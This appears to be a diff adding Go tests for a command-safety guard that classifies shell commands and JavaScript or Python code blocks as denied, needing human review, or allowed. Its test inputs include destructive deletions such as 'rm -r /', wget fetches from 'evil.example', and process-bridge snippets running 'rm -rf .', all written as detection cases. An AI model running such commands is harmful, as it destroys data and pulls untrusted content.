@@ -71,6 +71,8 @@ func TestGuardDeniesRecursiveCurrentDirectoryDeletion(t *testing.T) {
 		{"rm -r .", safety.DecisionDeny, "dangerous.rm_rf"},
 		{"rm -R .", safety.DecisionDeny, "dangerous.rm_rf"},
 		{"rm --recursive .", safety.DecisionDeny, "dangerous.rm_rf"},
+		{"rm -r /", safety.DecisionDeny, "dangerous.rm_rf"},
+		{"rm --recursive --no-preserve-root /", safety.DecisionDeny, "dangerous.rm_rf"},
 		{"rm -r ./build", safety.DecisionAllow, "safety.no_findings"},
 	} {
 		report := guard.Scan(safety.Request{Command: tc.command})
@@ -272,6 +274,37 @@ func TestGuardClassifiesDestructiveGitReset(t *testing.T) {
 			decision: safety.DecisionAllow,
 			rule:     "safety.no_findings",
 		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(safety.Request{Command: tc.command})
+			require.Equal(t, tc.decision, report.Decision, "%+v", report)
+			require.Equal(t, tc.rule, report.RuleID, "%+v", report)
+		})
+	}
+}
+
+func TestGuardClassifiesDestructiveGitRestore(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.AllowedCommands = []string{
+		"git", "git-restore", "git-checkout",
+	}
+	guard := mustGuard(t, policy)
+	for _, tc := range []struct {
+		name     string
+		command  string
+		decision safety.Decision
+		rule     string
+	}{
+		{"restore worktree", "git restore .", safety.DecisionNeedsHumanReview, "dangerous.git_restore"},
+		{"restore from source", "git -C work restore --source HEAD -- .", safety.DecisionNeedsHumanReview, "dangerous.git_restore"},
+		{"checkout paths", "git checkout -- .", safety.DecisionNeedsHumanReview, "dangerous.git_restore"},
+		{"checkout tree paths", "git checkout HEAD -- .", safety.DecisionNeedsHumanReview, "dangerous.git_restore"},
+		{"direct restore helper", "git-restore .", safety.DecisionNeedsHumanReview, "dangerous.git_restore"},
+		{"direct checkout helper", "git-checkout -- .", safety.DecisionNeedsHumanReview, "dangerous.git_restore"},
+		{"interactive restore", "git restore --patch .", safety.DecisionAllow, "safety.no_findings"},
+		{"interactive checkout", "git checkout -p -- .", safety.DecisionAllow, "safety.no_findings"},
+		{"branch checkout", "git checkout main", safety.DecisionAllow, "safety.no_findings"},
+		{"restore without path", "git restore", safety.DecisionAllow, "safety.no_findings"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			report := guard.Scan(safety.Request{Command: tc.command})
@@ -2091,6 +2124,153 @@ func TestGuardReviewsWgetExecutableConfiguration(t *testing.T) {
 	}
 }
 
+func TestGuardReviewsWgetInputFiles(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.NetworkAllowlist = []string{"github.com"}
+	guard := mustGuard(t, policy)
+	for _, tc := range []struct {
+		name     string
+		command  string
+		decision safety.Decision
+		rule     string
+	}{
+		{
+			name:     "separate external input URL",
+			command:  "wget -i https://evil.example/urls",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "attached external input URL",
+			command:  "wget -ihttps://evil.example/urls",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "grouped attached external input URL",
+			command:  "wget -qihttps://evil.example/urls",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "long attached external input URL",
+			command:  "wget --input-file=https://evil.example/urls",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "Windows wget external input URL",
+			command:  "wget.exe -i https://evil.example/urls",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "local input file",
+			command:  "wget --input-file=urls.txt",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "network.input_file",
+		},
+		{
+			name:     "stdin input file",
+			command:  "wget -i -",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "network.input_file",
+		},
+		{
+			name:     "allowlisted input URL still reviewed",
+			command:  "wget -i https://api.github.com/urls",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "network.input_file",
+		},
+		{
+			name:     "direct allowlisted URL",
+			command:  "wget https://api.github.com/file",
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(safety.Request{Command: tc.command})
+			require.Equal(t, tc.decision, report.Decision, "%+v", report)
+			require.Equal(t, tc.rule, report.RuleID, "%+v", report)
+		})
+	}
+}
+
+func TestGuardReviewsScpLocalProgramSelectors(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.AllowedCommands = []string{"scp", "scp.exe", "echo"}
+	policy.NetworkAllowlist = []string{"github.com"}
+	guard := mustGuard(t, policy)
+	for _, tc := range []struct {
+		name     string
+		command  string
+		decision safety.Decision
+		rule     string
+	}{
+		{
+			name:     "connection program",
+			command:  "scp -S echo README.md api.github.com:/tmp/x",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "command.indirect_execution",
+		},
+		{
+			name:     "sftp server",
+			command:  "scp -D echo README.md api.github.com:/tmp/x",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "command.indirect_execution",
+		},
+		{
+			name:     "attached connection program",
+			command:  "scp -Secho README.md api.github.com:/tmp/x",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "command.indirect_execution",
+		},
+		{
+			name:     "grouped connection program",
+			command:  "scp -TS echo README.md api.github.com:/tmp/x",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "command.indirect_execution",
+		},
+		{
+			name:     "Windows connection program",
+			command:  "scp -S ./runner.exe README.md api.github.com:/tmp/x",
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.command",
+		},
+		{
+			name:     "Windows sftp server",
+			command:  "scp -D ./server.exe README.md api.github.com:/tmp/x",
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.command",
+		},
+		{
+			name:     "Windows scp connection program",
+			command:  "scp.exe -S echo README.md api.github.com:/tmp/x",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "command.indirect_execution",
+		},
+		{
+			name:     "Windows scp without selector",
+			command:  "scp.exe README.md api.github.com:/tmp/x",
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name:     "no local selector",
+			command:  "scp README.md api.github.com:/tmp/x",
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(safety.Request{Command: tc.command})
+			require.Equal(t, tc.decision, report.Decision, "%+v", report)
+			require.Equal(t, tc.rule, report.RuleID, "%+v", report)
+		})
+	}
+}
+
 func TestGuardRecognizesGroupedAndObjectNetworkAliases(t *testing.T) {
 	policy := safety.DefaultPolicy()
 	policy.NetworkAllowlist = []string{"github.com"}
@@ -2322,6 +2502,39 @@ func TestGuardScansAliasedLanguageProcessBridges(t *testing.T) {
 	}
 }
 
+func TestGuardScansNodeProcessBridges(t *testing.T) {
+	guard := mustGuard(t, safety.DefaultPolicy())
+	for _, code := range []string{
+		`require("child_process").execFileSync("rm", ["-rf", "."])`,
+		`require("node:child_process").execFile("rm", ["-rf", "."])`,
+		`const cp = require("node:child_process"); cp.execFileSync("rm", ["-rf", "."])`,
+		`const {execFileSync: run} = require("child_process"); run("rm", ["-rf", "."])`,
+		`import {fork as run} from "node:child_process"; run("./worker.js")`,
+		`import cp from "child_process"; cp.fork("./worker.js")`,
+	} {
+		report := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{{
+			Language: "javascript", Code: code,
+		}}})
+		require.NotEqual(t, safety.DecisionAllow, report.Decision, code)
+		require.Equal(t, "code.process_bridge", report.RuleID, code)
+	}
+
+	allowed := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{{
+		Language: "javascript",
+		Code: `const cp = require("child_process");
+			client.execFileSync("rm", ["-rf", "."]);`,
+	}}})
+	require.Equal(t, safety.DecisionAllow, allowed.Decision, "%+v", allowed)
+
+	ambiguous := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{{
+		Language: "javascript",
+		Code: `const {execFile} = require("node:child_process");
+			execFile(program, args);`,
+	}}})
+	require.Equal(t, safety.DecisionNeedsHumanReview, ambiguous.Decision, "%+v", ambiguous)
+	require.Equal(t, "code.process_bridge", ambiguous.RuleID, "%+v", ambiguous)
+}
+
 func TestGuardScansNotebookAndPythonProcessBridges(t *testing.T) {
 	guard := mustGuard(t, safety.DefaultPolicy())
 	for _, code := range []string{
@@ -2339,6 +2552,116 @@ func TestGuardScansNotebookAndPythonProcessBridges(t *testing.T) {
 		}}})
 		require.Equal(t, safety.DecisionDeny, report.Decision, code)
 		require.Equal(t, "code.process_bridge", report.RuleID, code)
+	}
+}
+
+func TestGuardScansPythonExecProcessBridges(t *testing.T) {
+	guard := mustGuard(t, safety.DefaultPolicy())
+	for _, tc := range []struct {
+		name     string
+		code     string
+		decision safety.Decision
+		rule     string
+	}{
+		{
+			name:     "qualified execvp",
+			code:     `import os; os.execvp("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "from import execvp",
+			code:     `from os import execvp; execvp("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name: "parenthesized import execvp",
+			code: "from os import (\n execvp as launch,\n)\n" +
+				`launch("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "multiple imported functions",
+			code:     `from os import system, execvp; execvp("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "module alias execv",
+			code:     `import os as operating_system; operating_system.execv("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "module alias with whitespace",
+			code:     `import os as operating_system; operating_system . execv("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "assigned exec alias",
+			code:     `import os; launch = os.execvp; launch("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "dynamic import exec",
+			code:     `__import__("os").execvp("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "star import exec",
+			code:     `from os import *; execvp("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "dynamic attribute exec",
+			code:     `import os; getattr(os, "execvp")("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "execle family",
+			code:     `from os import execlpe as launch; launch("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionDeny,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "dynamic executable",
+			code:     `import os; os.execvp(program, argv)`,
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "dynamic exec attribute",
+			code:     `import os; getattr(os, method)(program, argv)`,
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "code.process_bridge",
+		},
+		{
+			name:     "comment only",
+			code:     `# os.execvp("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name:     "unrelated object method",
+			code:     `client.execvp("rm", ["rm", "-rf", "."])`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{{
+				Language: "python", Code: tc.code,
+			}}})
+			require.Equal(t, tc.decision, report.Decision, "%+v", report)
+			require.Equal(t, tc.rule, report.RuleID, "%+v", report)
+		})
 	}
 }
 
